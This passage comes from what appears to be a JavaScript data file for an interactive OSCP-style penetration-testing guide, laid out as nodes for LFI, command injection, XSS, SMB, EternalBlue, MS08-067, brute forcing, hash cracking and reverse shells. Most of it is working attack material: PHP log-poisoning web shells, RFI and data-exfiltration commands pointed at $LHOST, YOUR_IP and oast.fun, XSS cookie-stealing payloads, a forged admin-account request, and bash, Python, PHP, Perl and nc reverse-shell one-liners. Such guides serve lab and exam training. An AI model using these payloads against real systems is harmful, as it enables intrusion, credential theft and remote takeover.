  -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt \
  -fw 0

# ── PHP WRAPPERS ──────────────────────────
# Source code read (base64 encode)
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=../config.php
# Decode: echo "BASE64OUTPUT" | base64 -d

# RCE via data wrapper (needs allow_url_include=On)
data://text/plain,<?php system('id')?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+

# ── LOG POISONING → RCE ──────────────────
# Step 1: Inject PHP into access log via User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://$ip/
# Or via SSH login attempt (hits auth.log):
ssh '<?php system($_GET["cmd"]); ?>'@$ip

# Step 2: Include log with command parameter
http://$ip/page?file=/var/log/apache2/access.log&cmd=id
http://$ip/page?file=/var/log/auth.log&cmd=id

# ── /proc/self/environ ────────────────────
# Requires: server process has read access (older Apache/nginx configs)
# Inject into HTTP_USER_AGENT header:
curl -A "<?php system(\$_GET['cmd']); ?>" "http://$ip/vuln.php?file=/proc/self/environ&cmd=id"
# Also try: HTTP_ACCEPT, HTTP_REFERER headers if UA is sanitized

# ── /proc/self/fd (file descriptor brute) ─
# Apache access log is often /proc/self/fd/[N] where N = 1–20
# Inject UA first, then brute fd number:
for i in $(seq 1 25); do
  curl -s "http://$ip/vuln.php?file=/proc/self/fd/$i&cmd=id" | grep -q "uid=" && echo "fd/$i works"
done

# ── RFI (Remote File Inclusion) ───────────
# Check: allow_url_include=On in php.ini (rare, but still seen on old boxes)
# Host a PHP shell on your attack box:
# echo '<?php system($_GET["cmd"]); ?>' > shell.txt
# python3 -m http.server 80

http://$ip/page?file=http://YOUR_IP/shell.txt&cmd=id
http://$ip/page?file=\\\\YOUR_IP\\share\\shell.php  # Windows UNC path RFI

# ── SESSION FILE INCLUSION ────────────────
# If you can control a session variable value, poison it then include the session file
# Default PHP session paths: /var/lib/php/sessions/sess_[SESSIONID]
#                             /tmp/sess_[SESSIONID]
# Step 1: set a session var to PHP payload via normal app function
# Step 2: include the session file
http://$ip/page?file=/var/lib/php/sessions/sess_[YOUR_SESSION_ID]&cmd=id`,
    warn: "Windows LFI: always try win.ini first as your canary. If it reads, LFI is confirmed on Windows. web.config and applicationHost.config frequently contain plaintext credentials — highest value reads on a Windows/IIS target. /proc/self/environ requires the server process to have read access — it works less often than log poisoning but is faster when it does. Log poisoning: inject once, then include — if the log grows (check size) but PHP does not execute, the log file may be being rotated or you may have injected into the wrong log path.",
    choices: [
      { label: "Log poisoning RCE — get shell", next: "reverse_shell" },
      { label: "PHP wrapper RCE working", next: "reverse_shell" },
      { label: "Found SSH key", next: "ssh_key" },
      { label: "Found creds in config / web.config", next: "creds_found" },
      { label: "Need custom wordlist for deeper fuzzing", next: "custom_wordlist" },
    ],
  },

  cmd_injection: {
    phase: "WEB",
    title: "Command Injection",
    body: "CMDi has two forms: visible output (easy) and blind (hard). Know the difference before you start. For visible: operators and output are everything. For blind: time delays and out-of-band callbacks are your only confirmation. Work through operators systematically — the app may only be vulnerable to one specific separator. Filter bypass is its own layer; WAFs often block obvious chars but miss encoded or nested variants.",
    cmd: `# ── STEP 1: IDENTIFY INJECTION CONTEXT ──
# What does the param feed? ping, curl, nslookup, system(), exec(), shell_exec()
# Network util params (host=, target=, ip=) → ping/curl style injection
# File util params (file=, path=, name=) → shell_exec / system style
# Both may accept the same operators but behave differently

# ── STEP 2: OPERATOR MATRIX ──────────────
# Try each — only one may work depending on how the app calls the shell
; id                          # semicolon — most common
| id                          # pipe — run id regardless
|| id                         # OR — runs if left side fails
& id                          # background + run id
&& id                         # AND — runs if left side succeeds
\`id\`                          # backtick subshell
$(id)                         # $() subshell — survives more contexts
%0a id                        # newline (URL encoded) — bypasses some filters
; id #                        # comment out remainder
; id ;                        # wrap with semicolons

# ── STEP 3: BLIND CMDi DETECTION ─────────
# Time delay — 5s sleep = confirmed blind CMDi
; sleep 5
| sleep 5
$(sleep 5)
\`sleep 5\`
& ping -c 5 127.0.0.1 &      # Windows: ping -n 5 127.0.0.1

# Out-of-band callback — start listener/interactsh first
# interactsh (best OOB):
interactsh-client                               # note your *.oast.fun domain
; curl http://YOUR.oast.fun/$(whoami)           # data exfil in URL
; nslookup $(whoami).YOUR.oast.fun             # DNS exfil (survives strict egress)
; wget -q -O- http://$LHOST/$(id|base64)       # base64-encode output in URL

# tcpdump to catch callbacks:
sudo tcpdump -i tun0 icmp or port 80

# ── STEP 4: FILTER BYPASS ─────────────────
# Spaces blocked → use IFS or \${IFS}
;cat\${IFS}/etc/passwd
;cat$IFS/etc/passwd

# Blacklisted keywords → quote splitting
;c'a't /etc/passwd
;w'h'o'a'm'i
;/???/??t /etc/passwd        # globbing: /bin/cat via wildcards
;/usr/bin/id

# Base64 encode entire command (no special chars in payload)
echo "aWQ=" | base64 -d | bash                 # decodes to: id
;echo\${IFS}Y2F0IC9ldGMvcGFzc3dk|base64\${IFS}-d|bash

# Hex encode
;printf 'id' | bash                      # hex for 'id'

# Case variation (Windows cmd.exe only)
;WhoAmI
;wHoAmI

# ── STEP 5: COMMIX — AUTOMATED ───────────
# GET param
commix --url="http://$ip/page?param=test" --level=3

# POST param
commix --url="http://$ip/page" --data="field=test" --level=3

# WAF-aware — randomise agent, force ssl, skip waf detection
commix --url="http://$ip/page?param=test" \\
  --level=3 --force-ssl --skip-waf --random-agent

# ── STEP 6: EXFIL DATA (blind, no callback) ──
# If OOB blocked, write output to a web-readable file then curl it
; id > /var/www/html/out.txt
curl http://$ip/out.txt

; cat /etc/passwd > /var/www/html/out.txt
curl http://$ip/out.txt`,
    warn: "Blind CMDi: if sleep works but curl/ping OOB does not, egress is filtered. Write output to a web-readable path and fetch it. If filesystem is read-only, use DNS exfil — nslookup with $(cmd) subshell in the lookup domain works through almost everything. Always URL-encode your payload when injecting via browser/Burp — spaces and & will break the request before the app ever sees them.",
    choices: [
      { label: "Confirmed visible output — get shell", next: "reverse_shell" },
      { label: "Blind — time delay confirmed, OOB working", next: "reverse_shell" },
      { label: "Blind — egress filtered, DNS only", next: "reverse_shell" },
      { label: "Filter blocking everything — try commix", next: "reverse_shell" },
      { label: "Windows target — PowerShell injection", next: "windows_post_exploit" },
    ],
  },

  xss: {
    phase: "WEB",
    title: "XSS",
    body: "XSS alone rarely wins a box — but it reliably escalates. The chain is: find injection → steal admin cookie → hijack session → reach admin panel → file upload or RCE. Stored XSS is the prize; reflected is the probe. Understand what the app does with the injection point before picking a payload. HttpOnly cookies can't be stolen via JS — pivot to CSRF or phishing instead.",
    cmd: `# ── STEP 1: DETECT INJECTION POINT ──────
# Probe every input: search, comments, profile fields, URL params, headers
# Canary payload — not a full attack, just checking for reflection
<script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(1)

# Reflected vs Stored:
#   Reflected: payload in URL/param, fires when you visit the URL
#   Stored:    payload saved in DB, fires when ANY user visits the page
#   DOM-based: payload interpreted by client-side JS, never hits server

# ── STEP 2: IDENTIFY COOKIE FLAGS ────────
# Before stealing cookies — check if they're even stealable
curl -sv http://$ip/login 2>&1 | grep -i "set-cookie"
# HttpOnly flag present → JS cannot read document.cookie → pivot to CSRF
# Secure flag present   → only sent over HTTPS
# No HttpOnly           → stealable via fetch/XHR

# ── STEP 3: COOKIE THEFT PAYLOAD ─────────
# Start listener on Kali first:
nc -nlvp 80
# Or use python3 for cleaner output:
python3 -m http.server 80

# Basic cookie exfil (GET request to your server)
<script>document.location='http://$LHOST/?c='+document.cookie</script>

# Fetch-based (avoids page redirect, stealthier)
<script>fetch('http://$LHOST/?c='+btoa(document.cookie))</script>

# Image tag (works even in strict HTML contexts)
<img src=x onerror="this.src='http://$LHOST/?c='+document.cookie">

# XHR (works where fetch is blocked)
<script>var x=new XMLHttpRequest();x.open('GET','http://$LHOST/?c='+document.cookie);x.send()</script>

# ── STEP 4: SESSION HIJACK ────────────────
# Take the stolen cookie value and set it in your browser
# Burp: Proxy → Options → Match/Replace → Add rule:
#   Replace: Cookie: session=YOUR_SESSION
#   With:    Cookie: session=STOLEN_COOKIE
# Or use browser dev tools: Application → Cookies → edit value

# ── STEP 5: STORED XSS — ESCALATE ────────
# If injection is stored (comments, profile, tickets):
# Payload fires for EVERY user who visits — including admins
# Use a payload that auto-exfils on page load:
<script>
var i=new Image();
i.src='http://$LHOST/steal?c='+encodeURIComponent(document.cookie)+'&u='+encodeURIComponent(document.location);
</script>

# ── STEP 6: CSP BYPASS ────────────────────
# Check Content Security Policy before building payload
curl -sv http://$ip 2>&1 | grep -i "content-security-policy"

# Common bypass techniques:
# CSP allows 'self':    use JSONP endpoint on same domain
# CSP allows CDN:       load malicious script from allowed CDN
# CSP missing script-src: inline script still works
# No CSP at all:        any payload works

# ── STEP 7: BLIND XSS (stored, no feedback) ──
# You inject but can't see the result — admin reviews it later
# Use a callback payload — XSS Hunter or interactsh catches it
<script src="https://YOUR.xss.ht"></script>
# Or host your own:
<script>fetch('http://$LHOST/blind?h='+encodeURIComponent(document.location)+
  '&c='+encodeURIComponent(document.cookie)+'&r='+encodeURIComponent(document.referrer))</script>

# ── STEP 8: XSS → CSRF (HttpOnly cookies) ─
# Can't steal cookie? Use JS to make authenticated requests AS the admin
# Example: add yourself as admin via XSS-triggered POST request
<script>
fetch('/api/admin/adduser', {
  method: 'POST',
  headers: {'Content-Type':'application/json'},
  credentials: 'include',
  body: JSON.stringify({username:'attacker',password:'pass123',role:'admin'})
})
</script>`,
    warn: "HttpOnly cookies cannot be read by JavaScript — document.cookie will be empty or incomplete. If you see HttpOnly in Set-Cookie headers, pivot from theft to CSRF: use XSS to make authenticated API requests on behalf of the admin. Always check CSP before choosing a payload — a blocked inline script wastes time. Stored XSS in an admin review queue is worth more than reflected XSS you trigger yourself.",
    choices: [
      { label: "Stole admin cookie — hijack session", next: "login_page" },
      { label: "Session hijacked — admin panel reached", next: "file_upload" },
      { label: "HttpOnly cookie — pivot to CSRF via XSS", next: "web_fuzz_deep" },
      { label: "Blind XSS — waiting for admin callback", next: "web_fuzz_deep" },
      { label: "XSS → admin panel → file upload", next: "file_upload" },
    ],
  },

  searchsploit_web: {
    phase: "RECON",
    title: "Searchsploit — Find a Public Exploit",
    body: "You have a version number. That is a gift. Every service version goes through searchsploit — no exceptions. This is the OffSec methodology: enumerate → get version → searchsploit → read code → copy → modify → fire. Do this for every service on every port. A version number on an obscure port has cracked more boxes than any fancy technique.",
    cmd: `# ── STEP 1: SEARCH ───────────────────────
# Use the service name and version — be specific first, broad if nothing found
searchsploit <service> <version>
searchsploit apache 2.4.49
searchsploit openssh 7.2
searchsploit proftpd 1.3.5
searchsploit "qdPM 9.1"       # quote exact app names with spaces

# Broad search if specific returns nothing:
searchsploit apache 2.4          # try minor version only
searchsploit proftpd              # try service name only
searchsploit smb microsoft        # try service + vendor

# Exclude noise (PoC-only, DoS):
searchsploit apache 2.4 --exclude="(PoC)|/dos/"

# Search online (Exploit-DB in browser):
searchsploit --www apache 2.4.49

# Google operators as backup:
# site:exploit-db.com "apache 2.4.49"
# site:github.com "CVE-2021-41773" exploit
# "service version" exploit site:packetstormsecurity.com

# ── STEP 2: READ THE EXPLOIT FIRST ───────
# -x opens the exploit in the terminal — READ IT before running anything
searchsploit -x <EDB-ID>
searchsploit -x 50944

# What to look for when reading:
# - What arguments does it take? (URL, user, pass, LHOST, LPORT)
# - Does it need credentials? (check if you have them)
# - What language? Python2 vs Python3 matters
# - Does it upload a file? Where? (webroot path may need updating)
# - Any suspicious system() calls on YOUR machine? (rm -rf style)
# - Does it have a usage/help section at the top?

# ── STEP 3: COPY TO WORKING DIRECTORY ────
# -m copies to your current dir so you can modify it safely
# Never modify the original in /usr/share/exploitdb/
searchsploit -m <EDB-ID>
searchsploit -m 50944
searchsploit -m windows/remote/42031.py   # by path also works

# ── STEP 4: MODIFY FOR YOUR TARGET ───────
# Most exploits need at minimum:
# - LHOST / LPORT updated to your tun0 IP and listener port
# - Target IP / URL updated
# - Python2 → Python3 fixes if needed

# Check your tun0 IP:
ip a show tun0 | grep "inet " | awk '{print $2}' | cut -d/ -f1

# Common Python2 → Python3 fixes:
# print "x"       → print("x")
# raw_input()     → input()
# urllib2         → urllib.request
# httplib         → http.client

# ── STEP 5: SET UP LISTENER FIRST ────────
nc -nlvp $LPORT

# ── STEP 6: FIRE ──────────────────────────
python3 exploit.py
python3 exploit.py -url http://$ip/ -u user@target.com -p password
python exploit.py $ip 443   # some take positional args

# If exploit errors — read the usage section again carefully
# Run with python2 if python3 fails
# Check if dependencies need installing: pip install <module> --break-system-packages

# ── WHEN SEARCHSPLOIT RETURNS NOTHING ────
# Don't stop — work outward from the version:

# Try one version up and one down (banners can be wrong):
searchsploit apache 2.4.50    # if you saw 2.4.49
searchsploit apache 2.4.48

# Try strict mode to cut false positives:
searchsploit -s "ProFTPD 1.3.5"   # exact match only

# Try just the service name (no version):
searchsploit proftpd
searchsploit vsftpd

# Online sources when local DB has nothing:
# https://www.exploit-db.com (search by app name)
# https://packetstormsecurity.com
# https://sploitus.com (aggregates Exploit-DB + GitHub + more)
# Google: site:exploit-db.com "service version"
# Google: site:github.com CVE-YEAR-XXXXX exploit
# Google: "service version" exploit poc

# Version mismatch — exploit targets slightly different version:
# Read the vulnerable code path — does the function still exist?
# Check git history of the app if open source
# Try it anyway — patch levels often don't close the exact vuln`,
    warn: "READ THE CODE before running any public exploit. The 0pen0wn SSH exploit is the famous example — it decoded to 'rm -rf ~ /* 2>/dev/null &' and would wipe your Kali machine. This is not hypothetical. Searchsploit returns local results from /usr/share/exploitdb/ — run 'sudo apt update && sudo apt install exploitdb' before an engagement to make sure it's current. Never modify exploits in their original location — always -m to copy first.",
    choices: [
      { label: "Found an exploit — read it before running", next: "exploit_readcheck" },
      { label: "Got shell — stabilize it", next: "shell_upgrade" },
      { label: "Exploit needs credentials — go find them", next: "bruteforce" },
      { label: "Nothing in searchsploit — widen the search", next: "searchsploit_web" },
      { label: "Exploit needs modification — Python/C errors", next: "exploit_compile" },
      { label: "Custom app — no public exploit exists", next: "bof" },
      { label: "Can get user to click something — client-side", next: "client_side" },
    ],
  },

  // ══════════════════════════════════════════
  //  SMB
  // ══════════════════════════════════════════
  smb_enum: {
    phase: "SMB",
    title: "SMB Enumeration",
    body: "SMB is information-rich. Null session, guest access, share contents, user enumeration. Always run smb-vuln* — MS17-010 and MS08-067 both show up on OSCP practice machines.",
    cmd: `# Full enum
enum4linux-ng -A $ip | tee smb_enum.txt

# CME — null + guest
crackmapexec smb $ip -u '' -p '' --shares
crackmapexec smb $ip -u 'guest' -p '' --shares
crackmapexec smb $ip -u '' -p '' --users

# List + browse shares
smbclient -L //$ip -N
smbclient //$ip/share -N

# Vuln check — run both
nmap --script smb-vuln* -p 445 $ip
# MS17-010 = EternalBlue (Win 7 / Server 2008)
# MS08-067 = NetAPI overflow (Win XP / Server 2003)`,
    warn: null,
    choices: [
      { label: "Got SMB/Samba version — searchsploit it", next: "searchsploit_web" },
      { label: "MS17-010 / EternalBlue vulnerable", next: "eternalblue" },
      { label: "MS08-067 vulnerable (XP / Server 2003)", next: "ms08_067" },
      { label: "Readable shares — download everything", next: "smb_loot" },
      { label: "Got usernames — brute force", next: "bruteforce" },
      { label: "Need creds to go further", next: "bruteforce" },
    ],
  },

  eternalblue: {
    phase: "SMB",
    title: "EternalBlue (MS17-010)",
    body: "Manual exploitation only — no Metasploit. AutoBlue is clean and reliable. Read the script before running.",
    cmd: `# AutoBlue-MS17-010 (manual, no MSF)
git clone https://github.com/3ndG4me/AutoBlue-MS17-010
cd AutoBlue-MS17-010
pip install -r requirements.txt

# Generate shellcode
chmod +x shellcode/shell_prep.sh
./shellcode/shell_prep.sh
# Enter LHOST + LPORT when prompted

# Start listener
nc -nlvp $LPORT

# Fire exploit
python3 eternalblue_exploit7.py $ip shellcode/sc_x64.bin

# If x64 fails, try x86
python3 eternalblue_exploit7.py $ip shellcode/sc_x86.bin`,
    warn: "AutoBlue can crash the target if it's unstable. Revert the machine if it goes unresponsive.",
    choices: [
      { label: "Got SYSTEM shell!", next: "windows_post_exploit" },
      { label: "Exploit unstable — try manual MS17-010 PoC", next: "searchsploit_web" },
    ],
  },

  ms08_067: {
    phase: "SMB",
    title: "MS08-067 — NetAPI Overflow",
    body: "Remote code execution on Windows XP / Server 2003 via a crafted RPC request. Manual exploitation requires picking the correct target number for the exact OS version — wrong target crashes the machine. Identify the OS first from your nmap output, then match it to the exploit's target list.",
    cmd: `# ── STEP 1: CONFIRM OS VERSION ───────────
# From your targeted scan — look for:
# Windows XP SP2, Windows XP SP3, Windows Server 2003 SP1/SP2
# The exploit needs the exact version for correct shellcode offset

# ── STEP 2: GET THE EXPLOIT ───────────────
searchsploit ms08-067
searchsploit -m 7132    # classic Python PoC
# Or use the well-known manual PoC:
# https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py

# ── STEP 3: CHECK TARGET LIST ─────────────
python ms08-067.py
# Running with no args prints the target list:
# 1  - Windows XP SP0/SP1 Universal
# 2  - Windows XP SP2 English
# 3  - Windows XP SP3 English
# 6  - Windows 2003 SP0 Universal
# 7  - Windows 2003 SP1 English
# etc.
# Match your OS version — wrong target = crash

# ── STEP 4: GENERATE SHELLCODE ────────────
# Replace the shellcode in the exploit with your own
msfvenom -p windows/shell_reverse_tcp \\
  LHOST=$LHOST LPORT=$LPORT \\
  EXITFUNC=thread -b "\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40" \\
  -f py -v shellcode
# -b flag: bad chars for MS08-067 — these MUST be excluded
# EXITFUNC=thread keeps the service alive after exploitation

# ── STEP 5: PATCH + FIRE ──────────────────
# Open the exploit in a text editor
# Replace the shellcode variable with your msfvenom output
# Set listener:
nc -nlvp $LPORT

# Fire:
python ms08-067.py $ip [TARGET_NUMBER] 445
# Example: python ms08-067.py 192.168.184.10 6 445`,
    warn: "Wrong target number = service crash and machine goes unresponsive — revert required. Always identify the exact OS SP level before firing. Bad chars for this exploit are specific: \x00\x0a\x0d\x5c\x5f\x2f\x2e\x40 — msfvenom must exclude all of them or the shellcode corrupts. EXITFUNC=thread is mandatory to keep the vulnerable service running after you get the shell.",
    choices: [
      { label: "Got SYSTEM shell!", next: "windows_post_exploit" },
      { label: "Machine crashed — revert and try correct target", next: "ms08_067" },
      { label: "Shellcode not executing — check bad chars", next: "ms08_067" },
    ],
  },

  smb_loot: {
    phase: "SMB",
    title: "SMB Loot",
    body: "Recursively download everything. Grep for credentials, keys, configs. Don't read files one by one — bulk download and grep.",
    cmd: `# Recursive download
smbclient //$ip/share -N \\
  -c 'recurse ON; prompt OFF; mget *'

# Mount the share
sudo mount -t cifs //$ip/share /mnt/share \\
  -o username=,password=,vers=2.0

# Bulk grep for creds
grep -rih "password\\|passwd\\|secret\\|api_key\\|token\\|credential" /mnt/share/
find /mnt/share -name "*.xml" -o -name "*.config" \\
  -o -name "*.ini" -o -name "*.txt" \\
  -o -name "*.ps1" -o -name "*.bat" \\
  | xargs grep -il "pass" 2>/dev/null`,
    warn: null,
    choices: [
      { label: "Found credentials", next: "creds_found" },
      { label: "Found scripts/code — review them", next: "code_review" },
      { label: "Found SSH key", next: "ssh_key" },
    ],
  },

  code_review: {
    phase: "SMB",
    title: "Code / Script Review",
    body: "Scripts and executables on shares are often goldmines. Hardcoded creds, command execution, scheduled task payloads.",
    cmd: `# Grep for hardcoded creds
grep -rih "password\\|passwd\\|secret\\|key\\|token" . 2>/dev/null

# Grep for execution / injection
grep -rih "exec\\|system\\|popen\\|eval\\|invoke" . 2>/dev/null

# Strings on binaries
strings binary_file | grep -i "pass\\|user\\|http\\|key"

# Decompile .NET assemblies
ilspycmd binary.dll > output.cs
dnspy binary.exe   # GUI`,
    warn: null,
    choices: [
      { label: "Found hardcoded credentials", next: "creds_found" },
      { label: "Found command execution vector", next: "cmd_injection" },
    ],
  },

  // ══════════════════════════════════════════
  //  FTP
  // ══════════════════════════════════════════
  ftp_enum: {
    phase: "FTP",
    title: "FTP Enumeration",
    body: "Anonymous login is more common than people expect. If writable AND web-accessible, you can drop a shell directly.",
    cmd: `# Anonymous login test
ftp $ip
# Try: anonymous / anonymous
#      anonymous / (blank)

# Nmap scripts
nmap --script ftp-anon,ftp-bounce,ftp-syst -p 21 $ip

# If login works — download everything
ftp> binary
ftp> mget *
ftp> passive

# If FTP dir is under webroot — upload shell
ftp> put shell.php`,
    warn: null,
    choices: [
      { label: "Got FTP version — searchsploit it", next: "searchsploit_web" },
      { label: "Anonymous access — found interesting files", next: "smb_loot" },
      { label: "FTP writable + webroot accessible = shell", next: "reverse_shell" },
      { label: "Need creds", next: "bruteforce" },
    ],
  },

  // ══════════════════════════════════════════
  //  SSH
  // ══════════════════════════════════════════
  ssh_only: {
    phase: "SSH",
    title: "SSH Only Exposed",
    body: "SSH alone is rarely the initial attack vector. You need creds or a key from somewhere. Check non-standard web ports — something else is almost always running.",
    cmd: `# Check non-standard ports
nmap -p 8000,8080,8443,8888,9000,9090,3000,5000 $ip

# SSH version / algo audit
ssh-audit $ip

# Banner grab
nc -nv $ip 22

# Username enum (if older OpenSSH)
ssh-user-enum.py -U /usr/share/seclists/Usernames/Names/names.txt -t $ip`,
    warn: "Brute forcing SSH without a targeted username list is almost never the path.",
    choices: [
      { label: "Got SSH version — searchsploit it", next: "searchsploit_web" },
      { label: "Found web on non-standard port", next: "web_enum" },
      { label: "Got creds from elsewhere — SSH in", next: "linux_post_exploit" },
      { label: "Got SSH key", next: "ssh_key" },
    ],
  },

  ssh_key: {
    phase: "SSH",
    title: "SSH Key Found",
    body: "Always check permissions first — SSH will refuse a key that's world-readable. If passphrase-protected, crack it with ssh2john.",
    cmd: `chmod 600 id_rsa
ssh -i id_rsa user@$ip
ssh -i id_rsa -o StrictHostKeyChecking=no user@$ip

# Crack passphrase
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -m 22921 id_rsa.hash /usr/share/wordlists/rockyou.txt

# Try all users from /etc/passwd
for user in $(cat users.txt); do
  ssh -i id_rsa $user@$ip -o StrictHostKeyChecking=no 2>/dev/null && echo "HIT: $user"
done`,
    warn: null,
    choices: [
      { label: "SSH'd in — Linux privesc", next: "linux_post_exploit" },
      { label: "Cracking passphrase", next: "hashcrack" },
    ],
  },

  // ══════════════════════════════════════════
  //  OTHER SERVICES
  // ══════════════════════════════════════════
  other_services: {
    phase: "RECON",
    title: "Other Services",
    body: "SNMP leaks configs and community strings. DNS zone transfers can reveal the whole network map. LDAP and RPC enumerate users without authentication.",
    cmd: `# SNMP — community string brute + walk
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $ip
snmpwalk -c public -v1 $ip
snmp-check $ip

# DNS zone transfer
dig axfr @$ip domain.com
host -l domain.com $ip
dnsrecon -d domain.com -t axfr

# LDAP anonymous bind
ldapsearch -x -h $ip -b "dc=domain,dc=com"
ldapsearch -x -h $ip -b "" -s base namingContexts

# RPC null session
rpcclient -U "" $ip
> enumdomusers
> enumdomgroups
> queryuser <RID>

# NFS shares
showmount -e $ip`,
    warn: null,
    choices: [
      { label: "Got service version — searchsploit it", next: "searchsploit_web" },
      { label: "Got usernames from SNMP/LDAP/RPC", next: "bruteforce" },
      { label: "SMTP open — enumerate users", next: "smtp_enum" },
      { label: "DNS — try zone transfer", next: "dns_enum" },
      { label: "Domain info found — pivot to AD", next: "ad_nocreds" },
      { label: "NFS share found — mount it", next: "nfs_enum" },
    ],
  },

  // ══════════════════════════════════════════
  //  BRUTE FORCE / CREDS
  // ══════════════════════════════════════════
  bruteforce: {
    phase: "CREDS",
    title: "Brute Force",
    body: "Build a targeted wordlist from the site with CeWL before throwing rockyou at everything. Username + password combos, default creds, and seasonal passwords are all common.",
    cmd: `# Build custom wordlist from target
cewl http://$ip -d 3 -m 5 -w custom.txt

# Hydra — SSH
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \\
  ssh://$ip -t 4 -o hydra_ssh.txt

# Hydra — web form
hydra -l admin -P rockyou.txt \\
  http-post-form "/login:user=^USER^&pass=^PASS^:Invalid" -V

# Hydra — SMB
hydra -L users.txt -P rockyou.txt smb://$ip

# Hydra — FTP
hydra -L users.txt -P rockyou.txt ftp://$ip

# CME spray (check lockout policy first!)
crackmapexec smb $ip -u users.txt -p passwords.txt \\
  --continue-on-success`,
    warn: "Check lockout policy before spraying AD. Getting accounts locked will end your exam.",
    choices: [
      { label: "Got credentials!", next: "creds_found" },
      { label: "No luck — searchsploit service versions", next: "searchsploit_web" },
    ],
  },

  hashcrack: {
    phase: "CREDS",
    title: "Hash Cracking",
    body: "Identify hash type first — wrong module wastes time. Rules multiply your wordlist effectiveness massively.",
    cmd: `# Identify
hash-identifier <hash>
hashid <hash>
# Or: https://hashes.com/en/tools/hash_identifier

# ── HASH MODULE REFERENCE ─────────────────
# MD5           = -m 0
# SHA1          = -m 100
# SHA256        = -m 1400
# NTLM          = -m 1000      ← Windows local accounts
# NetNTLMv1     = -m 5500
# NetNTLMv2     = -m 5600      ← Responder captures
# sha512crypt   = -m 1800      ← Linux $6$
# sha256crypt   = -m 7400      ← Linux $5$
# md5crypt      = -m 500       ← Linux $1$
# bcrypt        = -m 3200      ← Linux $2y$
# Kerberoast    = -m 13100     ← $krb5tgs$23$ (RC4)
# Kerberoast    = -m 19700     ← $krb5tgs$18$ (AES-256)
# AS-REP        = -m 18200     ← $krb5asrep$
# SSH key       = -m 22921

# ── SECRETSDUMP OUTPUT FORMAT ─────────────
# impacket-secretsdump produces: username:RID:LM:NTLM:::
# Extract just NTLM hashes for hashcat:
grep -oP ':[0-9a-f]{32}:::' secretsdump.txt | tr -d ':' > ntlm_only.txt
# Or keep username:hash format and use --username:
hashcat -m 1000 secretsdump.txt /usr/share/wordlists/rockyou.txt --username
# --username tells hashcat to ignore the username prefix in each line

# ── CRACK ────────────────────────────────
hashcat -m <module> hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m <module> hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m <module> hash.txt rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule

# Rule stacking (combine two rule files):
hashcat -m 1000 hash.txt rockyou.txt \\
  -r /usr/share/hashcat/rules/best64.rule \\
  -r /usr/share/hashcat/rules/toggles1.rule

# Show cracked results:
hashcat -m 1000 hash.txt --show
hashcat -m 1000 hash.txt --show --username   # if file has user:hash format

# ── JOHN FALLBACK ─────────────────────────
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john hash.txt --format=NT --wordlist=rockyou.txt
john --list=formats | grep -i ntlm   # find correct format name`,
    warn: "Always use --username when cracking secretsdump output — without it, hashcat tries to crack the username:RID prefix and fails silently. secretsdump NTLM hashes are the 4th colon-separated field: administrator:500:LMHASH:NTLMHASH::: — take only the NTLM portion. Machine account hashes (ending in $) almost never crack — skip them.",
    choices: [
      { label: "Cracked — got plaintext password", next: "creds_found" },
      { label: "rockyou failed — try larger list or more rules", next: "hashcrack" },
    ],
  },

  creds_found: {
    phase: "CREDS",
    title: "Credentials Found",
    body: "Spray those creds on every service immediately. Password reuse is the most consistent win on OSCP. Same user, same password, different service.",
    cmd: `# Try everything
ssh user@$ip
evil-winrm -i $ip -u user -p 'password'
crackmapexec smb $ip -u user -p 'password'
crackmapexec winrm $ip -u user -p 'password'
smbclient //$ip/share -U user
ftp $ip   # try creds manually
mysql -u user -p'password' -h $ip

# Check all share access with creds
crackmapexec smb $ip -u user -p 'password' --shares
crackmapexec smb $ip -u user -p 'password' --users
crackmapexec smb $ip -u user -p 'password' --groups`,
    warn: null,
    choices: [
      { label: "SSH / shell access — Linux machine", next: "linux_post_exploit" },
      { label: "WinRM / RDP / SMB — Windows machine", next: "windows_post_exploit" },
      { label: "Web access only", next: "file_upload" },
      { label: "Spray these creds everywhere NOW", next: "cred_reuse" },
    ],
  },

  // ══════════════════════════════════════════
  //  SHELL & UPGRADE
  // ══════════════════════════════════════════
  reverse_shell: {
    phase: "SHELL",
    title: "Catch the Shell",
    body: "Listener first, then execute payload. Use 443 or 80 — egress filtering blocks high ports constantly. pwncat-cs auto-upgrades TTY. If the shell dies immediately, the issue is almost always the payload encoding or a filtered port.",
    cmd: `# ── LISTENERS ────────────────────────────
# pwncat-cs (best — auto TTY, file transfer built in)
pwncat-cs -lp $LPORT

# nc fallback
nc -nlvp $LPORT

# ── LINUX PAYLOADS ────────────────────────
# Bash (most reliable on Linux)
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
# URL encoded version (for web shells/curl):
bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/$LPORT+0>%261'

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$LHOST",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python2 fallback
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$LHOST",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP (web context)
php -r '$sock=fsockopen("$LHOST",$LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="$LHOST";$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# nc with -e (if available)
nc $LHOST $LPORT -e /bin/bash

# ── WINDOWS PAYLOADS ─────────────────────
